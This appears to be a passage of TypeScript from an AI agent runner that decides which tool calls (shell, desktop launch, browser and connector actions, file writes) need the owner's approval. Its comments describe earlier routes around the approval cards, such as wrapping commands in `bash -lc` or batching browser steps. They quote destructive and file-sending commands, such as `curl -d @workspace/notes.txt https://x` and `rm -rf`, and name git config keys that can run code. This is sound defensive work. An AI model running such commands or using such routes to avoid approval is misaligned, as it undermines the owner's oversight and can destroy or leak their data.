   * A command that can remove or overwrite data, whichever tool was used to start it.
   *
   * Shared with desktop_launch, which spawns a program directly. The runner already refuses to
   * start a privilege escalation or a package manager that way - the comment there says the point
   * is that "the same command the shell refuses runs unchecked simply by asking for a window" -
   * but only those two classes were covered, so `desktop_launch bash -c 'rm -rf workspace'` went
   * through with no card at all outside review mode. The window is not what makes a command safe.
   */
  const destructiveCommand = (
    executable: string,
    commandArgs: string[]
  ): { action: string; preview: string } | null => {
    const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
    const gitCommand = executable === 'git' ? gitSubcommand(commandArgs) : null;
    const gitDestructive =
      (gitCommand === 'clean' && lowerArgs.some((argument) => /^-[a-z]*f/.test(argument))) ||
      (gitCommand === 'reset' && lowerArgs.includes('--hard')) ||
      gitCommand === 'restore' ||
      (gitCommand === 'checkout' && lowerArgs.includes('--'));
    const findDelete = executable === 'find' && lowerArgs.includes('-delete');
    const rsyncDelete = executable === 'rsync' && lowerArgs.includes('--delete');
    // A command that runs another one is judged by what it runs. `find . -exec rm -rf {} +` and
    // `xargs rm` do exactly what `rm` does, and both went through untouched while the plain form
    // stopped the task - so the classification rewarded whichever phrasing the model happened to
    // reach for rather than describing the effect.
    const wrapped =
      (COMMAND_RUNNERS.has(executable) ||
        (executable === 'find' &&
          lowerArgs.some((argument) => ['-exec', '-execdir', '-ok'].includes(argument)))) &&
      commandArgs.some((argument) => {
        const name = argument.split('/').pop() ?? '';
        return consequentialExecutables.has(name) || name.startsWith('mkfs');
      });
    const packageRemoval =
      packageRemovalExecutables.has(executable) &&
      lowerArgs.some((argument) => packageRemovalCommands.has(argument));
    const destructiveScript =
      commandInterpreters.has(executable) && isDestructiveScript(commandScript(args));
    if (
      !(
        consequentialExecutables.has(executable) ||
        executable.startsWith('mkfs') ||
        gitDestructive ||
        findDelete ||
        rsyncDelete ||
        wrapped ||
        packageRemoval ||
        destructiveScript
      )
    )
      return null;
    return {
      action: `Run ${executable}`,
      preview: `Run ${[executable, ...commandArgs].join(' ')} in the workspace. This can remove or overwrite data.`
    };
  };

  /*
   * Every gate below is asked of what the call really runs, not of what launched it.
   *
   * The shell tool's own description tells the model to reach for `bash -lc` the moment it needs a
   * pipe, a glob or a redirect, so most real work arrives wrapped. Only the autonomous network
   * allowlist read the script; the destructive, upload, push and package-install gates each read
   * `args.executable`, so wrapping the identical command removed the card entirely. On a clean turn
   * `bash -lc 'curl -d @workspace/notes.txt https://x'` sent the file with nothing shown to anybody
   * while the bare `curl -d …` stopped - and `context.ts` promises the owner, in the
   * always-resident operating contract, that external submissions and git pushes always stop.
   * `destructiveCommand` was half-converted already: it reads the script through
   * `isDestructiveScript`, which scans for `rm` and for escaping redirects and therefore never saw
   * a wrapped `git reset --hard` or a wrapped `find . -delete`.
   *
   * Shared with `desktop_launch` for the reason the taint half already gives further up this file:
   * both take an executable and arguments and run them on the owner's computer, and the one that is
   * not `shell` runs as the runner's own account rather than as the sandboxed agent. Judging only
   * `shell` here left a card-free duplicate of every command below reachable by asking for a window
   * instead of a pipe.
   */
  const commandRequirement = (): ApprovalRequirement | null => {
    const executable = textValue(args.executable).split('/').pop() ?? '';
    const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
    const invocation = shellInvocation(args);
    const commands = effectiveCommands(args);
    const destructive =
      destructiveCommand(executable, commandArgs) ??
      commands.map(([command = '', ...rest]) => destructiveCommand(command, rest)).find(Boolean);
    if (destructive) return { sideEffect: 'external_consequential', ...destructive };
    /*
     * `git config` writes `.gitconfig` without ever naming a path, so the deferred-execution rule
     * above - which reads the paths a call writes - cannot see it. It is the likeliest way to write
     * that file and the most dangerous: `core.hooksPath` points every later commit at a directory
     * of the writer's choosing, and an alias is a command git runs under whatever name it is given.
     * Neither shows up as a path token anywhere in the invocation.
     *
     * Reads are exempt by name rather than writes by name, so an option added to git later asks
     * rather than passes - and for the same reason the settings that cannot carry a command are an
     * exemption too, rather than the dangerous ones being a list. Naming the danger would have to
     * name `core.hooksPath`, `alias.*`, `include.path`, `core.pager`, `credential.helper`,
     * `filter.*.clean`, `core.fsmonitor`, `init.templateDir` and whatever git adds next, and would
     * pass every key invented after it was written. Setting a git identity is the first thing
     * anybody does on a fresh box and the first thing this computer's own coding path needs; it was
     * two `external_consequential` cards under a preview describing hooks paths and aliases, which
     * `user.name` cannot possibly carry. `gitConfigRunsCode` holds both halves, and
     * `isMutatingToolCall` reads the same predicate so the floor and the completion clock cannot
     * disagree about what a `git config` did.
     */
    const gitConfigWrite = commands.find(
      ([command = '', ...rest]) => command === 'git' && gitConfigRunsCode(rest)
    );
    if (gitConfigWrite)
      return {
        sideEffect: 'external_consequential',
        action: DEFERRED_EXECUTION_ACTION,
        preview: `Run ${invocation}. git config writes .gitconfig without naming it, and what lands there - core.hooksPath, or an alias - is executed by every later git invocation on this computer, outside any approval this task could raise.`
      };
    const installer = commands.find(
      ([command = '', ...rest]) =>
        packageRemovalExecutables.has(command) &&
        rest.some((argument) => packageInstallCommands.has(argument.toLowerCase()))
    );
    if (installer && securityMode !== 'autonomous')
      return {
        sideEffect: 'external_reversible',
        action: `Install or update software with ${installer[0]}`,
        preview: `Run ${invocation} inside the persistent Linux computer. Downloaded software and its publisher terms become part of this installation.`
      };
    if (
      commands.some(
        ([command = '', ...rest]) => command === 'git' && gitSubcommand(rest) === 'push'
      )
    )
      return {
        sideEffect: 'external_reversible',
        action: 'Push Git changes',
        preview: `Run ${invocation}`
      };
    const sender = commands.find(([command = '', ...rest]) => sendsDataOverNetwork(command, rest));
    if (sender)
      return {
        sideEffect: 'external_reversible',
        action: `Send data using ${sender[0]}`,
        preview: `Run ${invocation} with outbound network access. This can change an external service or upload workspace data.`
      };
    return null;
  };

  if (name === 'desktop_launch') {
    const requirement = commandRequirement();
    if (requirement) return requirement;
  }

  if (name === 'shell') {
    const executable = textValue(args.executable).split('/').pop() ?? '';
    const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
    const commands = effectiveCommands(args);
    const requirement = commandRequirement();
    if (requirement) return requirement;
    if (args.network === true && securityMode === 'autonomous') {
      /**
       * The allowlist judges what the command really runs, not what launched it. An interpreter is
       * never on the list and never can be - `bash` is not a network client, it is whatever the
       * script says - so the question is asked of each command the script names instead, under the
       * same rules the bare form would face: on the list, not sending data out, not destructive,
       * not a push. A script naming anything else, and a script this cannot read at all, both keep
       * their card; unknown fails closed, which is why the empty case is checked separately.
       */
      const unlisted = commands.find(
        ([command = '', ...rest]) =>
          !(safeNetworkExecutables.has(command) || command === 'gh') ||
          sendsDataOverNetwork(command, rest) ||
          destructiveCommand(command, rest) !== null ||
          (command === 'git' && gitSubcommand(rest) === 'push')
      );
      if (unlisted || commands.length === 0)
        return {
          sideEffect: 'external_reversible',
          action: `Review network access for ${unlisted?.[0] || executable || 'command'}`,
          preview: `Run ${[executable, ...commandArgs].join(' ')} with outbound network access. ${unlisted ? `It runs ${unlisted[0]}, which is not read-only or package-install use of the allowlist.` : 'What it runs could not be read, so its network use is unknown.'}`
        };
    }
    if (args.network === true && securityMode !== 'autonomous')
      return {
        sideEffect: 'external_reversible',
        action: `Allow internet access for ${executable || 'command'}`,
        // This used to promise that the default shell is network-isolated. The installer ships that
        // setting off, because a command in its own network namespace also has its own loopback and
        // published previews stop working - so the card was telling the owner a confinement was in
        // place that was not. Describe only what approving this actually does.
        preview: `Run ${[executable, ...commandArgs].join(' ')} with outbound network access, so it can reach the internet and send data out.`
      };
  }
  if (name === 'publish_site') {
    const label = textValue(args.label, 'App');
    const port = textValue(args.port, 'unknown');
    return {
      sideEffect: 'external_consequential',
      action: `Publish ${label} publicly`,
      preview: `Expose workspace port ${port} at a persistent public URL. Anyone with the URL can access the app until it is unpublished or revoked, and the URL answers only while something is still listening on that port.`
    };
  }
  if (name === 'browser_action') {
    // The action name is a sibling of the fields rather than the tag on a nested object, because
    // the twenty-variant union that shape came from cost about five kilobytes of every request.
    // Every gate below reads the same fields it always read; only where the verb is written moved.
    const action = surfaceActionVerb(args);
    // Still read as evidence for the consequential-text gate below, where it may only ever raise
    // the floor, and no longer written into the headline the owner answers.
    const purpose = textValue(args.purpose);
    const reason = statedReason(args.purpose);
    // A batch is twenty-four actions wearing one name. Judging it on that name let the whole
    // approval floor be stepped around by wrapping the submit click, the upload or the Enter press
    // in a batch with the fields it follows - so every step is judged as the action it is, and the
    // strongest requirement any of them raises is the one the owner answers.
    if (action === 'batch') {
      const steps = Array.isArray(args.actions) ? args.actions : [];
      let strongest: ApprovalRequirement | null = null;
      steps.forEach((step, index) => {
        const bag = (step && typeof step === 'object' ? step : {}) as Record<string, unknown>;
        const type = surfaceActionVerb(bag);
        // The runner's own union has no nested batch; refusing to descend keeps this bounded
        // whatever arrives.
        if (!type || type === 'batch') return;
        // The provenance half is deliberately not re-run per step: it already judged every address
        // in the batch at once, and asking it again here would show the owner the same destination
        // twice on one card.
        const requirement = ordinaryRequirement(
          name,
          { ...bag, purpose: args.purpose },
          securityMode,
          {}
        );
        if (!requirement) return;
        if (
          strongest &&
          APPROVAL_RANK[strongest.sideEffect] >= APPROVAL_RANK[requirement.sideEffect]
        )
          return;
        strongest = {
          ...requirement,
          // The step's verb through the same shape gate as the review card's, so one line of the
          // preview cannot be a sentence a page wrote: `type` here is `bag.action`, and a batch
          // step's bag is as model-written as the call around it.
          preview: `Step ${index + 1} of ${steps.length} in this batch (${surfaceVerbName(bag) || 'unnamed'}):\n${requirement.preview}`
        };
      });
      if (strongest) return strongest;
    }
    if (action === 'upload') {
      const paths = Array.isArray(args.paths) ? args.paths.map(String) : [];
      // The runner refuses an unapproved upload, so asking here is what makes uploads work at
      // all — and sending a workspace file to an outside site is worth a look regardless.
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Send ${paths.join(', ') || 'workspace files'} to this website.\n${reason}`
      };
    }
    if (action === 'click_at') {
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Coordinate clicks are ambiguous and always require confirmation.\n${reason}`
      };
    }
    if (action === 'press' && textValue(args.key).toLowerCase() === 'enter') {
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Pressing Enter can submit the focused form.\n${reason}`
      };
    }
    if (action === 'dialog' && args.response === 'accept') {
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `${
          args.promptText
            ? 'The dialog requests private text, so the user must take over secure input.'
            : 'Accepting a page confirmation can trigger an external action.'
        }\n${reason}`
      };
    }
    if (
      (action === 'click' || action === 'double_click') &&
      consequentialText.test(`${textValue(args.selector)} ${purpose}`)
    ) {
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Selector: ${textValue(args.selector, 'unknown')}\n${reason}`
      };
    }
  }
  if (name === 'desktop_action') {
    const action = surfaceActionVerb(args);
    const purpose = textValue(args.purpose);
    const reason = statedReason(args.purpose);
    if (action === 'click_at' || action === 'drag')
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Coordinate clicks are ambiguous and always require confirmation.\n${reason}`
      };
    if (action === 'press' && textValue(args.key).toLowerCase() === 'enter')
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Pressing Enter can submit the focused desktop control.\n${reason}`
      };
    if (action === 'invoke' && consequentialText.test(`${textValue(args.nodeId)} ${purpose}`))
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Accessibility node: ${textValue(args.nodeId, 'unknown')}\n${reason}`
      };
  }
  if (name === 'connector_action') {
    const action = textValue(args.action);
    const definition = connectorActions[action as keyof typeof connectorActions];
    if (definition?.sideEffect === 'read') return null;
    if (definition?.sideEffect === 'delete' || definition?.sideEffect === 'write')
      return {
        sideEffect:
          definition.sideEffect === 'delete' ? 'external_consequential' : 'external_reversible',
        ...connectorApprovalCard(
          action,
          (args.input && typeof args.input === 'object' ? args.input : {}) as Record<
            string,
            unknown
          >
        )
      };
  }
  if (securityMode === 'review') {
    if (name === 'shell')
      return {
        sideEffect: 'workspace_write',
        action: 'Run a command on this computer',
        // Through the same reader as every other card that prints a command, so the script handed
        // over on stdin is shown here too. It read `[executable, ...args]`, which is "Run bash" for
        // the one shape where the command is entirely in `stdin` - a card, in the mode that exists
        // to show commands, describing a command it did not show.
        preview: `Run ${shellInvocation(args) || 'command'}`
      };
    /*
     * The paths, because the paths are already in the call.
     *
     * This card read "Apply 3 conflict-checked file patch(es)" and named none of them, so Review
     * mode - the mode whose whole promise is that the owner sees a change before it lands - asked
     * for approval of an edit without saying what it edits. `file_patch` keeps `path` as a
     * top-level field of every patch rather than as a header inside the edit body PRECISELY so that
     * this card can read it (tool-catalogue.ts says so in as many words), and the card did not read
     * it. Nothing new was needed: `writtenPaths` is the same reader the deferred-execution rule
     * above and the durable-instruction rule use, so the three cannot disagree about which files a
     * call writes.
     */
    if (name === 'file_write' || name === 'file_patch' || name === 'print_pdf') {
      const patched = namedObjects(writtenPaths(name, args));
      return {
        sideEffect: 'workspace_write',
        action: 'Change a workspace file',
        preview:
          name === 'file_patch'
            ? `Apply ${Array.isArray(args.patches) ? args.patches.length : 0} conflict-checked file patch(es) to ${patched || 'a workspace file'}`
            : name === 'print_pdf'
              ? `Print the current page to ${textValue(args.path, 'a workspace PDF')}`
              : `Create or replace ${textValue(args.path, 'a workspace file')}`
      };
    }
    if (name === 'publish_artifact' || name === 'publish_preview' || name === 'desktop_launch')
      return {
        sideEffect: 'workspace_write',
        action:
          name === 'desktop_launch'
            ? 'Launch a desktop application'
            : name === 'publish_preview'
              ? 'Create a private preview'
              : 'Publish a file to the chat',
        preview:
          name === 'desktop_launch'
            ? `Launch ${textValue(args.executable, 'an application')} on this computer`
            : `Use ${textValue(args.path, textValue(args.label, 'workspace output'))}`
      };
    if (name === 'browser_action' || name === 'desktop_action') {
      const verb = surfaceVerbName(args);
      if (
        !['focus', 'hover', 'scroll', 'reload', 'back', 'go_back', 'navigate'].includes(
          surfaceActionVerb(args)
        )
      )
        return {
          sideEffect: 'workspace_write',
          action: `Review ${name === 'browser_action' ? 'a browser' : 'a desktop'} action`,
          // The verb, which is the one thing the owner needs and the card did not say: a `type`
          // and a `click` arrived under the same sentence with nothing to tell them apart. It goes
          // in the preview and not in the headline, and the selector, the node id and the typed
          // text stay out of both - the closed vocabulary above says why, and a batch already
          // names its step's verb here for the same reason.
          preview: `Review mode asks before each form or application change, and this one is ${verb || 'unnamed'}.\n${statedReason(args.purpose)}`
        };
    }
  }
  return null;
};
